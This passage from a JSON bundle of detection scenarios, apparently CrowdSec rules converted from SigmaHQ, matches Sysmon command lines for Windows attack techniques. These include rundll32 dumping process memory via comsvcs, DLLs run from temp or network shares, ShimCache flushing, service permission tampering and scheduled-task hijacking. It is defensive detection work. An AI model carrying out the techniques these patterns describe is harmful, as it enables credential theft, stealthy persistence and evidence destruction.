\"comsvcs.dll\" using rundll32, covering multiple different techniques (ordinal, minidump function, etc.)\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_process_dump_via_comsvcs.yml", "version": "0.2", "versions": {"0.1": {"digest": "dfa4139e4679c8e8c150c2c99049cb10377ce162afe46cf30259e2d44c960b6b"}, "0.2": {"digest": "c8e8f8772186ce00b72151286e0dc8412f57f55bfc9556f5a8513fe682be9e36"}}}, "sigmahq/proc_creation_win_rundll32_registered_com_objects": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_registered_com_objects\ndescription: |\n  load malicious registered COM objects\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && (evt.Parsed.CommandLine contains '-sta ' || evt.Parsed.CommandLine contains '-localserver ') && evt.Parsed.CommandLine contains '{' && evt.Parsed.CommandLine contains '}')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1546.015\n\n  label: \"Rundll32 Registered COM Objects\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "load malicious registered COM objects\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_registered_com_objects.yml", "version": "0.2", "versions": {"0.1": {"digest": "1410ffcbbe35884c58ab8a884e88e9c8baa1ded50aeab7494349754063be784a"}, "0.2": {"digest": "0a4ceeb4d507782beb6f2d09d4b2310a1a2ea0b95e4346ff514d8d20de7ac927"}}}, "sigmahq/proc_creation_win_rundll32_shell32_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_shell32_susp_execution\ndescription: |\n  Detects shell32.dll executing a DLL in a suspicious directory\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && evt.Parsed.CommandLine contains 'shell32.dll' && evt.Parsed.CommandLine contains 'Control_RunDLL' && (evt.Parsed.CommandLine contains '%AppData%' || evt.Parsed.CommandLine contains '%LocalAppData%' || evt.Parsed.CommandLine contains '%Temp%' || evt.Parsed.CommandLine contains '%tmp%' || evt.Parsed.CommandLine contains '\\\\AppData\\\\' || evt.Parsed.CommandLine contains '\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"Shell32 DLL Execution in Suspicious Directory\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects shell32.dll executing a DLL in a suspicious directory\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_shell32_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "74f5914318dc981469f15d8a174247daea2ac9c0532095eb6f3c374ce51baccc"}, "0.2": {"digest": "14514d8c4ae72f05b6c281ee935cc3346c0c11dbb00b062784c165eda899ea33"}}}, "sigmahq/proc_creation_win_rundll32_spawn_explorer": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_spawn_explorer\ndescription: |\n  Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\rundll32.exe' && evt.Parsed.Image endsWith '\\\\explorer.exe' && not (evt.Parsed.ParentCommandLine contains '\\\\shell32.dll,Control_RunDLL'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"RunDLL32 Spawning Explorer\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_spawn_explorer.yml", "version": "0.2", "versions": {"0.1": {"digest": "1e3ebe183fdab4bc173be17d9e15df3e97ca29a06b5aa3496f887268a49415e9"}, "0.2": {"digest": "e3d7a319ec0f96bc976d62735bf888334b3efb3fe2909ad3b3c45411c1e6a2b8"}}}, "sigmahq/proc_creation_win_rundll32_susp_control_dll_load": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_susp_control_dll_load\ndescription: |\n  Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\System32\\\\control.exe' && (evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE') && not (evt.Parsed.CommandLine contains 'Shell32.dll'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"Suspicious Control Panel DLL Load\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_susp_control_dll_load.yml", "version": "0.2", "versions": {"0.1": {"digest": "66ce62c510be83f45cd1cb01392e4d6d1b9e44244dbfd0ba1f5f8cf23ab6a2fc"}, "0.2": {"digest": "2b7d71deba9acc9ab7f9567dbfa8e9fb31b20a1455ad98d2ed35f48fb603573b"}}}, "sigmahq/proc_creation_win_rundll32_susp_execution_with_image_extension": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_susp_execution_with_image_extension\ndescription: |\n  Detects the execution of Rundll32.exe with DLL files masquerading as image files\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.exe') && (evt.Parsed.CommandLine contains '.bmp' || evt.Parsed.CommandLine contains '.cr2' || evt.Parsed.CommandLine contains '.eps' || evt.Parsed.CommandLine contains '.gif' || evt.Parsed.CommandLine contains '.ico' || evt.Parsed.CommandLine contains '.jpeg' || evt.Parsed.CommandLine contains '.jpg' || evt.Parsed.CommandLine contains '.nef' || evt.Parsed.CommandLine contains '.orf' || evt.Parsed.CommandLine contains '.png' || evt.Parsed.CommandLine contains '.raw' || evt.Parsed.CommandLine contains '.sr2' || evt.Parsed.CommandLine contains '.tif' || evt.Parsed.CommandLine contains '.tiff'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"Suspicious Rundll32 Execution With Image Extension\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of Rundll32.exe with DLL files masquerading as image files\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_susp_execution_with_image_extension.yml", "version": "0.2", "versions": {"0.1": {"digest": "ae1a6935f41e76fe6f092b9e60bf575f515954e090545ff15d41fbd2fb3b3b06"}, "0.2": {"digest": "36c0d5393a4449212b731ec95773523ae376cc427c88e2fc4ba491d5d8de7062"}}}, "sigmahq/proc_creation_win_rundll32_susp_shellexec_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_susp_shellexec_execution\ndescription: |\n  Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'ShellExec_RunDLL' && (evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'msiexec' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains 'odbcconf' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Temp\\\\' || evt.Parsed.CommandLine contains 'Invoke-' || evt.Parsed.CommandLine contains 'iex' || evt.Parsed.CommandLine contains 'comspec'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Usage Of ShellExec_RunDLL\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_susp_shellexec_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "4c83fdce902f4c5ce68dc3a42181329b2376fcfb65cab7832d72685b4dd794e6"}, "0.2": {"digest": "52ea34c76f4aec7af4f1fb99c4b66b61d1c7529acca8ef5057c574786edc4dbe"}}}, "sigmahq/proc_creation_win_rundll32_susp_shimcache_flush": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_susp_shimcache_flush\ndescription: |\n  Detects actions that clear the local ShimCache and remove forensic evidence\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'rundll32' && evt.Parsed.CommandLine contains 'apphelp.dll' && (evt.Parsed.CommandLine contains 'ShimFlushCache' || evt.Parsed.CommandLine contains '#250') || evt.Parsed.CommandLine contains 'rundll32' && evt.Parsed.CommandLine contains 'kernel32.dll' && (evt.Parsed.CommandLine contains 'BaseFlushAppcompatCache' || evt.Parsed.CommandLine contains '#46'))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"ShimCache Flush\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects actions that clear the local ShimCache and remove forensic evidence\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_susp_shimcache_flush.yml", "version": "0.2", "versions": {"0.1": {"digest": "f278d2d252951c4bc790503eaaccbdc5671fa95234e96c37681cc7ce993ddb07"}, "0.2": {"digest": "cdf4510914460155ac317675e330ae5c1c05b3ac90bf58e920648474b7893448"}}}, "sigmahq/proc_creation_win_rundll32_sys": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_sys\ndescription: |\n  Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'rundll32.exe' && (evt.Parsed.CommandLine contains '.sys,' || evt.Parsed.CommandLine contains '.sys '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"Suspicious Rundll32 Activity Invoking Sys File\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_sys.yml", "version": "0.2", "versions": {"0.1": {"digest": "0c5378ebfd9bc4c1726cf2362ff7b086f029483f816f96c961edfcba134c3e6e"}, "0.2": {"digest": "32e7ff8126a5c9020f1342099be238cb3c95db55e0cb53b280da77463e763582"}}}, "sigmahq/proc_creation_win_rundll32_unc_path": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_unc_path\ndescription: |\n  Detects rundll32 execution where the DLL is located on a remote location (share)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName == 'RUNDLL32.EXE' || evt.Parsed.CommandLine contains 'rundll32') && evt.Parsed.CommandLine contains ' \\\\\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.002\n   - attack.t1218.011\n\n  label: \"Rundll32 UNC Path Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects rundll32 execution where the DLL is located on a remote location (share)\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_unc_path.yml", "version": "0.2", "versions": {"0.1": {"digest": "5b3fca000fadd2959d18c1bf4e87bb9323f9a7effe4925182e76af153ae841e4"}, "0.2": {"digest": "d75d25464cfbc066629604d1f469fc678de67a2edecc8f46998a80bb060a5b6e"}}}, "sigmahq/proc_creation_win_rundll32_webdav_client_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_webdav_client_susp_execution\ndescription: |\n  Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397 \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\svchost.exe' && evt.Parsed.ParentCommandLine contains '-s WebClient' && evt.Parsed.Image endsWith '\\\\rundll32.exe' && evt.Parsed.CommandLine contains 'C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie' && evt.Parsed.CommandLine matches '://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}' && not (evt.Parsed.CommandLine contains '://10.' || evt.Parsed.CommandLine contains '://192.168.' || evt.Parsed.CommandLine contains '://172.16.' || evt.Parsed.CommandLine contains '://172.17.' || evt.Parsed.CommandLine contains '://172.18.' || evt.Parsed.CommandLine contains '://172.19.' || evt.Parsed.CommandLine contains '://172.20.' || evt.Parsed.CommandLine contains '://172.21.' || evt.Parsed.CommandLine contains '://172.22.' || evt.Parsed.CommandLine contains '://172.23.' || evt.Parsed.CommandLine contains '://172.24.' || evt.Parsed.CommandLine contains '://172.25.' || evt.Parsed.CommandLine contains '://172.26.' || evt.Parsed.CommandLine contains '://172.27.' || evt.Parsed.CommandLine contains '://172.28.' || evt.Parsed.CommandLine contains '://172.29.' || evt.Parsed.CommandLine contains '://172.30.' || evt.Parsed.CommandLine contains '://172.31.' || evt.Parsed.CommandLine contains '://127.' || evt.Parsed.CommandLine contains '://169.254.'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1048.003\n\n  label: \"Suspicious WebDav Client Execution Via Rundll32.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397 \n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_webdav_client_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "d0b897eb8992b58a66c414d7833734ee4a05b8043b3f2dbe4ced6d4ee170d8cc"}, "0.2": {"digest": "5a57d574898efdfa967a76267e7382ae7aa71a2702fc135a63da2664d3dc70f5"}}}, "sigmahq/proc_creation_win_rundll32_without_parameters": {"content": "type: trigger\nname: sigmahq/proc_creation_win_rundll32_without_parameters\ndescription: |\n  Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine in ['rundll32.exe', 'rundll32'])\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021.002\n   - attack.t1570\n   - attack.t1569.002\n\n  label: \"Rundll32 Execution Without Parameters\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module\n", "path": "scenarios/sigmahq/proc_creation_win_rundll32_without_parameters.yml", "version": "0.2", "versions": {"0.1": {"digest": "d7cdb55306dc54d56b895e822a83bbc4641736f102476feb9ead03409e9770f2"}, "0.2": {"digest": "1052edf6b84768f1fa8fcaef96147919c188b97ca65395f1d978d92eed228232"}}}, "sigmahq/proc_creation_win_sc_change_sevice_image_path_by_non_admin": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sc_change_sevice_image_path_by_non_admin\ndescription: |\n  Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\sc.exe' && evt.Parsed.IntegrityLevel == 'Medium' && (evt.Parsed.CommandLine contains 'config' && evt.Parsed.CommandLine contains 'binPath' || evt.Parsed.CommandLine contains 'failure' && evt.Parsed.CommandLine contains 'command'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.011\n\n  label: \"Possible Privilege Escalation via Weak Service Permissions\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand\n", "path": "scenarios/sigmahq/proc_creation_win_sc_change_sevice_image_path_by_non_admin.yml", "version": "0.2", "versions": {"0.1": {"digest": "a6a2f6936d5b4f7c823e62c05a805b17863ba33e08e58714c2728e00c6783f98"}, "0.2": {"digest": "4bfe1d5cca2ecf38ae7032a1b238af70dd642bcddcc603d2691d73db22bffaa4"}}}, "sigmahq/proc_creation_win_sc_sdset_allow_service_changes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sc_sdset_allow_service_changes\ndescription: |\n  Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.OriginalFileName == 'sc.exe') && evt.Parsed.CommandLine contains 'sdset' && evt.Parsed.CommandLine contains 'A;' && (evt.Parsed.CommandLine contains ';IU' || evt.Parsed.CommandLine contains ';SU' || evt.Parsed.CommandLine contains ';BA' || evt.Parsed.CommandLine contains ';SY' || evt.Parsed.CommandLine contains ';WD'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1543.003\n\n  label: \"Allow Service Access Using Security Descriptor Tampering Via Sc.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\n", "path": "scenarios/sigmahq/proc_creation_win_sc_sdset_allow_service_changes.yml", "version": "0.2", "versions": {"0.1": {"digest": "f3942e8b965f07a4a0de7024f93450b129cf69cf6d829a230922f6632b111ede"}, "0.2": {"digest": "d8b66d63b2e02fa38ed822b54724be5e6e9d1a0a33fb986e459ecdcdf9e2a401"}}}, "sigmahq/proc_creation_win_sc_sdset_deny_service_access": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sc_sdset_deny_service_access\ndescription: |\n  Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.OriginalFileName == 'sc.exe') && evt.Parsed.CommandLine contains 'sdset' && evt.Parsed.CommandLine contains 'D;' && (evt.Parsed.CommandLine contains ';IU' || evt.Parsed.CommandLine contains ';SU' || evt.Parsed.CommandLine contains ';BA' || evt.Parsed.CommandLine contains ';SY' || evt.Parsed.CommandLine contains ';WD'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1543.003\n\n  label: \"Deny Service Access Using Security Descriptor Tampering Via Sc.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\n", "path": "scenarios/sigmahq/proc_creation_win_sc_sdset_deny_service_access.yml", "version": "0.2", "versions": {"0.1": {"digest": "4af64d8169f410c02504f9ef036d42ed488eaa6c9ed8650f2a19c564f3478c2e"}, "0.2": {"digest": "d21ade90818536b5e85b8decb90971bd39d7eb09fdb03fbe2c8f9dd5dce91e7c"}}}, "sigmahq/proc_creation_win_sc_sdset_hide_sevices": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sc_sdset_hide_sevices\ndescription: |\n  Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.OriginalFileName == 'sc.exe') && evt.Parsed.CommandLine contains 'sdset' && evt.Parsed.CommandLine contains 'DCLCWPDTSD')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1574.011\n\n  label: \"Service DACL Abuse To Hide Services Via Sc.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\n", "path": "scenarios/sigmahq/proc_creation_win_sc_sdset_hide_sevices.yml", "version": "0.2", "versions": {"0.1": {"digest": "1e7e79927afcf9fb8e639a0f4d426993d7e246ae88c7fce103bce0af74153199"}, "0.2": {"digest": "cc9f1c36bb32abe597dafc10c04b0345191259e05d9ac3444992cfc196e257dc"}}}, "sigmahq/proc_creation_win_sc_service_path_modification": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sc_service_path_modification\ndescription: |\n  Detects service path modification via the \"sc\" binary to a suspicious command or path\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\sc.exe' && evt.Parsed.CommandLine contains 'config' && evt.Parsed.CommandLine contains 'binPath' && (evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'cmd ' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'svchost' || evt.Parsed.CommandLine contains 'dllhost' || evt.Parsed.CommandLine contains 'cmd.exe /c' || evt.Parsed.CommandLine contains 'cmd.exe /k' || evt.Parsed.CommandLine contains 'cmd.exe /r' || evt.Parsed.CommandLine contains 'cmd /c' || evt.Parsed.CommandLine contains 'cmd /k' || evt.Parsed.CommandLine contains 'cmd /r' || evt.Parsed.CommandLine contains 'C:\\\\Users\\\\Public' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\TEMP\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1543.003\n\n  label: \"Suspicious Service Path Modification\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects service path modification via the \"sc\" binary to a suspicious command or path\n", "path": "scenarios/sigmahq/proc_creation_win_sc_service_path_modification.yml", "version": "0.2", "versions": {"0.1": {"digest": "8fe5e740edbb96195943289acb46d592dac442bf812c7a7c0bb3533dd2c2dd45"}, "0.2": {"digest": "fc123aeb6bdeeefe51ca54d43946c08dc9e948283200a5430741d00066fa4684"}}}, "sigmahq/proc_creation_win_schtasks_appdata_local_system": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_appdata_local_system\ndescription: |\n  Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/Create' && evt.Parsed.CommandLine contains '/RU' && evt.Parsed.CommandLine contains '/TR' && evt.Parsed.CommandLine contains 'C:\\\\Users\\\\' && evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\' && (evt.Parsed.CommandLine contains 'NT AUT' || evt.Parsed.CommandLine contains ' SYSTEM ') && not (evt.Parsed.ParentImage contains '\\\\AppData\\\\Local\\\\Temp\\\\' && evt.Parsed.ParentImage contains 'TeamViewer_.exe' && evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains '/TN TVInstallRestore'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n   - attack.t1059.001\n\n  label: \"Suspicious Schtasks Execution AppData Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local\n", "path": "scenarios/sigmahq/proc_creation_win_schtasks_appdata_local_system.yml", "version": "0.2", "versions": {"0.1": {"digest": "747aaf45c279d2c4a33de02af8ce5db36eb610d4a4380c489280458bd49d5dbd"}, "0.2": {"digest": "6bb419e7037d79207e137763846ebd54c6850199cf83003224a1b8a77dadc7e7"}}}, "sigmahq/proc_creation_win_schtasks_change": {"content": "type: trigger\nname: sigmahq/proc_creation_win_schtasks_change\ndescription: |\n  Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location Attackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on Instead they modify the task after creation to include their malicious payload \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\schtasks.exe' && evt.Parsed.CommandLine contains ' /Change ' && evt.Parsed.CommandLine contains ' /TN ' && (evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Roaming\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\WINDOWS\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Temporary Internet' || evt.Parsed.CommandLine contains 'C:\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Perflogs\\\\' || evt.Parsed.CommandLine contains '%ProgramData%' || evt.Parsed.CommandLine contains '%appdata%' || evt.Parsed.CommandLine contains '%comspec%' || evt.Parsed.CommandLine contains '%localappdata%') && (evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'cmd /c ' || evt.Parsed.CommandLine contains 'cmd /k ' || evt.Parsed.CommandLine contains 'cmd /r ' || evt.Parsed.CommandLine contains 'cmd.exe /c ' || evt.Parsed.CommandLine contains 'cmd.exe /k ' || evt.Parsed.CommandLine contains 'cmd.exe /r ' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'wscript' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'certutil' || evt.Parsed.CommandLine contains 'bitsadmin' || evt.Parsed.CommandLine contains 'bash.exe' || evt.Parsed.CommandLine contains 'bash ' || evt.Parsed.CommandLine contains 'scrcons' || evt.Parsed.CommandLine contains 'wmic ' || evt.Parsed.CommandLine contains 'wmic.exe' || evt.Parsed.CommandLine contains 'forfiles' || evt.Parsed.CommandLine contains 'scriptrunner' || evt.Parsed.CommandLine contains 'hh.exe' || evt.Parsed.CommandLine contains 'hh '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.005\n\n  label: \"Suspicious Modification Of Scheduled Tasks\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location Attackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on Instead they modify the task after creation to include their malicious payload \n", "path": 